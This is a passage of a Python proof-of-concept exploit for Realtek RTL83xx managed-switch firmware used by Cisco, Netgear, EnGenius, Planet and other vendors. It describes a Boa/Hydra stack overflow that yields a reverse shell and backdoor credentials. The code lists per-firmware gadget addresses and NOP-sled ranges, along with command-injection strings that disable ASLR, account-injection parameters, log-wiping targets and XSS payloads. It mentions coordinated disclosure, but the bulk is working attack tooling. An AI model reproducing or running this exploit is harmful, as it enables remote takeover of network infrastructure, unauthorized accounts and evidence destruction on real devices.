#!/usr/bin/python2.7
#
"""

[Subject]

Realtek Managed Switch Controller (RTL83xx) PoC (2019 bashis)
https://www.realtek.com/en/products/communications-network-ics/category/managed-switch-controller

[Brief description]

1.	Boa/Hydra suffer of exploitable stack overflow with a 'one byte read-write loop' w/o boundary check. (all FW version and vendors affected)
	Note: The vulnerability are _not_ from Boa nor Hydra, coming from Realtek additional coding
2.	Reuse of code between vendors gives almost indentical exploitation of found vulnerabilities
3.	Two strcpy() vulnerable fixed buffers next to each others in same function make it easy for jumping in Big Endian

[Goals for this PoC]

1.	One Python PoC for all vendors
	Using dictionaries to have one 'template' for each vendor and another dictionary with unique details for each target, to be merged on the fly.
	The python code will read and use details from dictionary when verifying/exploiting

2.	Uniquely identify remote target
	ETag - Static and excellent tool for determine remote target, due to non-changing 'last modified' in same revision of Firmware

	ETag: xxxxx-yyyyy
	xxxxx = file size (up to 5 digits)
	yyyyy = last modified (up to 5 digits)

3.	Reverse shell
	MIPS Big Endian shellcode is the only option, as there are no 'netcat/telnet/stunnel.. etc' availible

4.	add/delete credentials for GUI/CLI
	Quite many of the firmware's has the 'option' to add valid credentials by unauthorized updating of 'running-config'
	For those who has added protection, we can add/delete credentials with an bit interesting jumping sequence

[Technical brief]
1.	Stack       - Read/Write/Executable (Using CMD injection in the PoC to turn off ASLR)
2.	Heap        - Read/Write/Executable (No need to turn off, ASLR not turned on for heap)
3.	fork        - Boa/Hydra using forking shellcode, as I want try restart Boa/Hydra to avoid DoS after successful reverse shell

Two vulnerable buffers with fixed size in same call, we overwrite $RA with four bytes, and overwrite first byte in $RA with second buffers NULL termination,
this allows us to jump within the binary itself, and passing arguments for the function we jumping to by tailing these with the original request

[Basically]
First buffer:         [aaaaaaaa][0x58xxxxxx]	('a' and 0x58 will be overwritten by second buffer)
Second buffer: [bbbbb][bbbbbbbb][0x00xxxxxx]	(NULL termination will overwrite 0x58)

[Known targets]

All below is fully exploitable, with following exception:
[*] ETag: 639-98866   [NETGEAR Inc. GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP v6.0.0.45]
[*] ETag: 639-73124   [NETGEAR Inc. GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP v6.0.0.37]

Not because they are not vulnerable, its because 1) their heap addresses lays at the '0x478000-0x47a000' range,
and 2) they using obfuscation 'encode' for the password (99 bytes max), we can never reach the 'two buffers' jump method.
[They are still fully exploitable with the Boa/Hydra vulnerability]

Note:
In this PoC I have only implemented few affected versions, in reality there is many more models and FW version affected.


$ ./Realtek-RTL83xx-PoC.py --etag help

[*] Realtek Managed Switch Controller RTL83xx PoC (2019 bashis)
[*] RHOST: 192.168.57.20
[*] RPORT: 80
[*] LHOST: 192.168.57.1
[*] LPORT: 1337
[+] Target: List of known targets

[*] ETag: 225-51973   [Cisco Systems, Inc. Sx220 v1.1.3.1]
[*] ETag: 225-60080   [Cisco Systems, Inc. Sx220 v1.1.4.1]
[*] ETag: 752-76347   [ALLNET GmbH Computersysteme ALL-SG8208M v2.2.1]
[*] ETag: 225-21785   [Pakedgedevice & Software Inc SX-8P v1.04]
[*] ETag: 222-71560   [Zyxel Communications Corp. GS1900-24 v2.40_AAHL.1_20180705]
[*] ETag: 14044-509   [EnGenius Technologies, Inc. EGS2110P v1.05.20_150810-1754]
[*] ETag: 13984-12788 [Open Mesh, Inc. OMS24 v01.03.24_180823-1626]
[*] ETag: 218-22429   [PLANET Technology Corp. GS-4210-8P2S v1.0b171116]
[*] ETag: 218-7473    [PLANET Technology Corp. GS-4210-24T2S v2.0b160727]
[*] ETag: 752-95168   [DrayTek Corp. VigorSwitch P1100 v2.1.4]
[*] ETag: 225-96283   [EDIMAX Technology Co., Ltd. GS-5424PLC v1.1.1.6]
[*] ETag: 225-63242   [EDIMAX Technology Co., Ltd. GS-5424PLC v1.1.1.5]
[*] ETag: 224-5061    [CERIO Corp. CS-2424G-24P v1.00.29]
[*] ETag: 222-50100   [ALLNET GmbH Computersysteme ALL-SG8310PM v3.1.1-R3-B1]
[*] ETag: 222-81176   [Shenzhen TG-NET Botone Technology Co,. Ltd. P3026M-24POE (V3) v3.1.1-R1]
[*] ETag: 8028-89928  [Araknis Networks AN-310-SW-16-POE v1.2.00_171225-1618]
[*] ETag: 222-64895   [Xhome DownLoop-G24M v3.0.0.43126]
[*] ETag: 222-40570   [Realtek RTL8380-24GE-4GEC v3.0.0.43126]
[*] ETag: 222-45866   [Abaniact AML2-PS16-17GP L2 v116B00033]
[*] ETag: 14044-44104 [EnGenius Technologies, Inc. EWS1200-28TFP v1.07.22_c1.9.21_181018-0228]
[*] ETag: 14044-32589 [EnGenius Technologies, Inc. EWS1200-28TFP v1.06.21_c1.8.77_180906-0716]
[*] ETag: 609-31457   [NETGEAR Inc. GS750E ProSAFE Plus Switch v1.0.0.22]
[*] ETag: 639-98866   [NETGEAR Inc. GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP v6.0.0.45]
[*] ETag: 639-73124   [NETGEAR Inc. GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP v6.0.0.37]


[*] All done...

[Other vendors]
These names have been found within some Firmware images, but not implemented as I have not found any Firmware images.
(However, I suspect they use exact same Firmware due to the traces are 'logo[1-10].jpg/login[1-10].jpg')

[*] 3One Data Communication, Saitian, Sangfor, Sundray, Gigamedia, GetCK, Hanming Technology, Wanbroad, Plexonics, Mach Power

[Known bugs]
1.	Non-JSON:
	'/mntlog/flash.log' and '/var/log/flash.log' not always removed when using 'stack_cgi_log()'
	(Must change value for 'flash.log' that needs to be 0x02, 'flash.log' has value 0x00)

[Responsible Disclosure]
Working with VDOO since early February 2019 to disclosure found vulnerabilities to vendors
https://www.vdoo.com/blog/disclosing-significant-vulnerabilities-network-switches


[Technical details]
Please read the code

"""
from __future__ import print_function
# Have a nice day
# /bashis
#

import string
import sys
import socket
import argparse
import urllib, urllib2, httplib
import base64
import ssl
import hashlib
import re
import struct
import time
import thread
import json
import inspect
import copy

import hashlib
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto import Random
from random import randint

from pwn import * # pip install pwn

global debug
debug = False
global force
force = False

def DEBUG(direction, text):
	if debug:
		# Print send/recv data and current line number
		print("[BEGIN {}] <{:-^60}>".format(direction, inspect.currentframe().f_back.f_lineno))
		print("\n{}\n".format(text))
		print("[ END  {}] <{:-^60}>".format(direction, inspect.currentframe().f_back.f_lineno))
	return

class HTTPconnect:

	def __init__(self, host, proto, verbose, creds, Raw):
		self.host = host
		self.proto = proto
		self.verbose = verbose
		self.credentials = creds
		self.Raw = Raw
	
	def Send(self, uri, query_headers, query_data,ID,encode_query):
		self.uri = uri
		self.query_headers = query_headers
		self.query_data = query_data
		self.ID = ID
		self.encode_query = encode_query

		# Connect-timeout in seconds
		#timeout = 5
		#socket.setdefaulttimeout(timeout)

		url = '{}://{}{}'.format(self.proto, self.host, self.uri)

		if self.verbose:
			log.info("[Verbose] Sending: {}".format(url))

		if self.proto == 'https':
			if hasattr(ssl, '_create_unverified_context'):
				#log.info("Creating SSL Unverified Context")
				ssl._create_default_https_context = ssl._create_unverified_context

		if self.credentials:
			Basic_Auth = self.credentials.split(':')
			if self.verbose:
				log.info("[Verbose] User: {}, Password: {}".format(Basic_Auth[0],Basic_Auth[1]))
			try:
				pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
				auth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)
				opener = urllib2.build_opener(auth_handler)
				urllib2.install_opener(opener)
			except Exception as e:
				log.info("Basic Auth Error: {}".format(e))
				sys.exit(1)

		if self.query_data:
			#request = urllib2.Request(url, data=json.dumps(self.query_data), headers=self.query_headers)
			if self.query_data and self.encode_query:
				request = urllib2.Request(url, data=urllib.urlencode(self.query_data,doseq=True), headers=self.query_headers)
			else:
				request = urllib2.Request(url, data=self.query_data, headers=self.query_headers)

			if self.ID:
				request.add_header('Cookie', self.ID)
		else:
			request = urllib2.Request(url, None, headers=self.query_headers)
			if self.ID:
				request.add_header('Cookie', self.ID)
		response = urllib2.urlopen(request)
		#if response:
		#	print "[<] {} OK".format(response.code)

		if self.Raw:
			return response
		else:
			html = response.read()
			return html

#
# Validate correctness of HOST, IP and PORT
#
class Validate:

	def __init__(self,verbose):
		self.verbose = verbose

	# Check if IP is valid
	def CheckIP(self,IP):
		self.IP = IP

		ip = self.IP.split('.')
		if len(ip) != 4:
			return False
		for tmp in ip:
			if not tmp.isdigit():
				return False
		i = int(tmp)
		if i < 0 or i > 255:
			return False
		return True

	# Check if PORT is valid
	def Port(self,PORT):
		self.PORT = PORT

		if int(self.PORT) < 1 or int(self.PORT) > 65535:
			return False
		else:
			return True

	# Check if HOST is valid
	def Host(self,HOST):
		self.HOST = HOST

		try:
			# Check valid IP
			socket.inet_aton(self.HOST) # Will generate exeption if we try with FQDN or invalid IP
			# Now we check if it is correct typed IP
			if self.CheckIP(self.HOST):
				return self.HOST
			else:
				return False
		except socket.error as e:
			# Else check valid FQDN name, and use the IP address
			try:
				self.HOST = socket.gethostbyname(self.HOST)
				return self.HOST
			except socket.error as e:
				return False

class Vendor:

	def __init__(self, ETag):
		self.ETag = ETag

	def random_string(self,length):
		self.length = length

		return "a" * self.length
		#return ''.join(random.choice(string.lowercase) for i in range(self.length))

	#
	# Source: https://gist.github.com/angstwad/bf22d1822c38a92ec0a9
	#
	def dict_merge(self, dct, merge_dct):
		""" Recursive dict merge. Inspired by :meth:``dict.update()``, instead of
		updating only top-level keys, dict_merge recurses down into dicts nested
		to an arbitrary depth, updating keys. The ``merge_dct`` is merged into
		``dct``.
		:param dct: dict onto which the merge is executed
		:param merge_dct: dct merged into dct
		:return: None
		"""
		for k, v in merge_dct.iteritems():
			if (k in dct and isinstance(dct[k], dict)
					and isinstance(merge_dct[k], collections.Mapping)):
				self.dict_merge(dct[k], merge_dct[k])
			else:
				dct[k] = merge_dct[k]


	#
	# Difference between vendors and Firmware versions.
	# The update code will search below and update the template on the fly
	# (you can tweak and add code in the template from here)
	#
	# ETag - excellent tool for determine the target
	#
	# ETag: xxxxx-yyyyy
	# xxxxx = file size (up to 5 digits)
	# yyyyy = last modified (up to 5 digits)
	#
	def dict(self):

		Vendor_ETag = {
			#
			# PLANET Technology Corp.
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : No
			# Del /mntlog/flash.log  : No
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'218-22429': {
				'template':'Planet',					# Static for the vendor
				'version':'1.0b171116',					# Version / binary dependent stuff
				'model':'GS-4210-8P2S',				# Model
				'uri':'https://www.planet.com.tw/en/product/GS-4210-8P2S',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E04C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99851c,			# la $t9, system) # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x2484029c,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_diag': {
						# Ping IPv4
						'sys_ping_post_cmd':'ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/check;&count=1',
						'verify_uri':'/tmp/check',
						'web_sys_ping_post':0x423B9C,	# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_ping_post()
						# traceroute
						#'sys_ping_post_cmd':'ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/check;&tr_maxhop=30&count=1',
						#'verify_uri':'/tmp/check',
						#'web_sys_ping_post':0x4243FC,	# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_trace_route_post()
						'vulnerable': True,
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
						'log_settings_set':0x489368,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_ramClear':0x48AB84,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_fileClear':0x48C240,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntp_set':0x42DA80,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject CMD)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntpDel_set':0x42DA80,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
						'sys_timeSettings_set':0x42C868,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'dispatcher.cgi',			# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
						'START':0x7ffeee04,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'usr_nop': 64,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 45,					# filler/garbage (not used for something constructive)
						'align': 3,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},
			'218-7473': {
				'template':'Planet',					# Static for the vendor
				'version':'2.0b160727',					# Version / binary dependent stuff
				'model':'GS-4210-24T2S',				# Model
				'uri':'https://www.planet.com.tw/en/product/GS-4210-24T2S',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E04C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99851c,			# la $t9, system) # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x2484029c,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_diag': {
						# Ping IPv4
						'sys_ping_post_cmd':'ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/check;&count=1',
						'verify_uri':'/tmp/check',
						'web_sys_ping_post':0x424594,	# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_ping_post()

						# traceroute
						#'sys_ping_post_cmd':'ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/check;&tr_maxhop=30&count=1',
						#'verify_uri':'/tmp/check',
						#'web_sys_ping_post':0x424DF4,	# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_trace_route_post()
						'vulnerable': True,
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
						'log_settings_set':0x48AA98,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_ramClear':0x48D9F4,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_fileClear':0x48D9F4,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntp_set':0x42E474,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject CMD)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntpDel_set':0x42E474,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
						'sys_timeSettings_set':0x42D25c,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'dispatcher.cgi',			# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
						'START':0x7ffeee04,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'usr_nop': 64,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 45,					# filler/garbage (not used for something constructive)
						'align': 3,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# Cisco Systems, Inc.
			# Sx220 Series
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : Yes
			# Del /mntlog/flash.log  : Yes
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'225-51973': {
				'template':'Cisco',						# Static for the vendor
				'version':'1.1.3.1',					# Version / binary dependent stuff
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40F70C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f998524,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x2484683c,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_diag': {
														# /sqfs/home/web/cgi/set.cgi;  cgi_sys_ping_set()
						# Ping IPv4
						'web_sys_ping_post':0x43535C,	# Jump one after 'sw $ra'			# (address, binary dependent)
						'sys_ping_post_cmd':'&srvHost=127.0.0.1 ";echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;"&count=1',
						'sys_ping_post_check':'',

														# /sqfs/home/web/cgi/set.cgi;  cgi_sys_tracert_set()
						# traceroute
						#'web_sys_ping_post':0x43567C,	# Jump one after 'sw $ra'			# (address, binary dependent)
						#'sys_ping_post_cmd':'&srvHost=127.0.0.1 ";echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;"&count=1',
						#'sys_ping_post_check':'',

						'verify_uri':'/tmp/check',
						'vulnerable': True,				# 
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi/set.cgi; cgi_log_settings_set()
						'log_settings_set':0x436FDC,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_ramClear_set()
						'log_ramClear':0x436F34,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_fileClear_set()
						'log_fileClear':0x436F88,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntp_set()
						'sys_timeSntp_set':0x434FB0,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntpDel_set()
						'sys_timeSntpDel_set':0x4350D8,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSettings_set()
						'sys_timeSettings_set':0x434140,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'set.cgi',				# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
						'START':0x7ffeff04,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'usr_nop': 64,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 77,					# filler/garbage (not used for something constructive)
						'align': 3,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},
			'225-60080': {
				'template':'Cisco',						# Static for the vendor
				'version':'1.1.4.1',					# Version / binary dependent stuff
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40ffac,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f998530,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x24847b6c,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_diag': {
														# /sqfs/home/web/cgi/set.cgi;  cgi_sys_ping_set()
						# Ping IPv4
						'web_sys_ping_post':0x43535C,	# Jump one after 'sw $ra'			# (address, binary dependent)
						'sys_ping_post_cmd':'&srvHost=127.0.0.1 ";echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;"&count=1',
						'sys_ping_post_check':'',

														# /sqfs/home/web/cgi/set.cgi;  cgi_sys_tracert_set()
						# traceroute
						#'web_sys_ping_post':0x43567C,	# Jump one after 'sw $ra'			# (address, binary dependent)
						#'sys_ping_post_cmd':'&srvHost=127.0.0.1 ";echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;"&count=1',
						#'sys_ping_post_check':'',

						'verify_uri':'/tmp/check',
						'vulnerable': True,				# 
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi/set.cgi; cgi_log_settings_set()
						'log_settings_set':0x436FDC,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_ramClear_set()
						'log_ramClear':0x436F34,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_fileClear_set()
						'log_fileClear':0x436F88,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntp_set()
						'sys_timeSntp_set':0x434FB0,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntpDel_set()
						'sys_timeSntpDel_set':0x4350D8,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSettings_set()
						'sys_timeSettings_set':0x434140,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'set.cgi',				# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
						'START':0x7ffeff04,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'usr_nop': 64,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 77,					# filler/garbage (not used for something constructive)
						'align': 3,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# EnGenius Technologies, Inc.
			# EGS series
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : Yes
			# Del /mntlog/flash.log  : Yes
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'14044-509': {
				'template':'EnGenius',						# Static for the vendor
				'version':'1.05.20_150810-1754',					# Version / binary dependent stuff
				'model':'EGS2110P',				# Model
				'uri':'https://www.engeniustech.com/engenius-products/8-port-gigabit-smart-switch-egs2110p/',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E12C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99851c,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x248405a0,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_diag': {
														# /sqfs/home/web/cgi-bin/datajson.cgi;  sn_tracertSet()
						# traceroute
						'web_sys_ping_post': 0x42382C,	# Jump one after 'sw $ra'			# (address, binary dependent)
						'sys_ping_post_cmd':'&ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check #&mh=30&uid=0',
						'sys_ping_post_check':'',
						'verify_uri':'/conf_tmp/check',

						'vulnerable': True,				# 
					},
					'stack_cgi_add_account': {
						# pt: 0 = no password, 1 = cleartext, 2 = encrypted
														# /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
						'address':0x423E74,				# Jump one after 'sw $ra'			# (address, binary dependent)
						'account':'&na=USERNAME&pt=2&pw=PASSWORD&pwn=PASSWORD&pv=0&op=1&',			# Admin, priv 15
						'vulnerable': True,
					},
					'stack_cgi_del_account': {
														# /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
						'address':0x423E74,				# Jump one after 'sw $ra'			# (address, binary dependent)
						'account':'&na=USERNAME&pt=2&pv=0&op=0',		# 
						'vulnerable': True,				# 
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_globalSet()
						'log_settings_set':0x43DE18,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
						'log_ramClear':0x43F934,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
						'log_fileClear':0x43F934,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
						'sys_timeSntp_set':0x424844,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntpDel_set()
						'sys_timeSntpDel_set':0x424844,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSettings_set()
						'sys_timeSettings_set':0x424844,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'security.cgi',			# /sqfs/home/web/cgi-bin/security.cgi; main()
						'START':0x100181A0,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x104006A0,				# end: You may want to play with this if you dont get it working
						'usr_nop': 987,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 69,					# filler/garbage (not used for something constructive)
						'align': 0,						# Align opcodes in memory
						'stack':False,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# EnGenius Technologies, Inc.
			# EWS series
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : Yes
			# Del /mntlog/flash.log  : Yes
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'14044-32589': {
				'template':'EnGenius',						# Static for the vendor
				'version':'1.06.21_c1.8.77_180906-0716',					# Version / binary dependent stuff
				'model':'EWS1200-28TFP',				# Model
				'uri':'https://www.engeniustech.com/engenius-products/managed-poe-network-switch-ews1200-28tfp/',
				'verify': { 
						'cpl_locallogin.cgi (XSS)': {
							'description':'XSS in "redirecturl,userurl,loginurl,username,password" (PoC: Count passed XSS)',
							'authenticated': False,
							'response':'xss',
							'Content-Type':False,
							'uri':'/cgi-bin/cpl_locallogin.cgi?redirecturl=<script>alert(XSS);</script>&userurl=<script>alert(XSS);</script>&loginurl=<script>alert(XSS);</script>',
							'content':'username=<script>alert(XSS);</script>&password=<script>alert(XSS);</script>',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'sn.captivePortal.login (XSS)': {
							'description':'XSS in "userurl & uamip" (PoC: Count passed XSS)',
							'authenticated': False,
							'response':'xss',
							'Content-Type':False,
							'uri':'/cgi-bin/sn.captivePortal.login?cmd=action',
							'content':'mac=dummy&res=dummy&userurl=<script>alert(XSS);</script>&uamip=<script>alert(XSS);</script>&alertmsg=dummy&called=dummy',
							'check_uri':False,
							'content_check':False,
